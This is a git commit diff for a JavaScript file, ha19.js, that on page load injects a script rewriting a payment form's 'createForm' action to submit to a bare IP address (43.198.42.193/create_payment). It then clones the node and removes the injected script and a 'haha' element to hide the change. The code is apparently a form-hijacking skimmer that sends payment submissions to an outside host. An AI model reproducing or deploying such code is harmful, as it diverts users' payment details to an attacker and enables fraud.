252bda63d7c79d56cd2fe55500b99f43c62f0a45
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-02 12:18:00 +0800

    Update and rename ha18.js to ha19.js

--- ha19.js
+++ ha19.js
@@ -3,7 +3,6 @@
 window.onload=function(){
      var scriptEle = document.createElement("script");
      scriptEle.type ="text/javascript";
-     scriptEle.id ="F10CD0ED-220F-54A6-E900-918D709D0CA4";
      scriptEle.text = `document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'`;
      var x = document.getElementById("createForm");
      x.insertBefore(scriptEle, x.firstChild);
@@ -13,5 +12,6 @@ window.onload=function(){
      let c = node.cloneNode(true);
      document.body.appendChild(c);
      x.remove();
-     document.getElementById("F10CD0ED-220F-54A6-E900-918D709D0CA4").remove();
+     scriptEle.remove();
+     document.getElementById("haha").remove();
 }
